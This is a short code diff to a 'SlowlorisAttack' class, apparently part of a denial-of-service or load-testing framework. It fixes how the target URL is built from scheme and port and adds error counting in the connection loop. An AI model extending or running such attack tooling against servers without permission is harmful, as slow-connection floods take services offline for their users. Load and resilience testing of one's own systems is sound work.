@@ -25,7 +25,8 @@ class SlowlorisAttack(BaseAttacker):
         **kwargs: Any,
     ) -> None:
         if not target.startswith(("http://", "https://")):
-            target_url = f"http://{target}"
+            scheme = "https" if port == 443 else "http"
+            target_url = f"{scheme}://{target}:{port}"
         else:
             target_url = target
 
@@ -55,8 +56,10 @@ class SlowlorisAttack(BaseAttacker):
                                 self.session.stats.packets_sent += 1
                                 self.session.stats.bytes_sent += 1
                         except Exception:
+                            self.session.stats.errors += 1
                             break
             except Exception:
+                self.session.stats.errors += 1
                 pass
             finally:
                 await session.close()
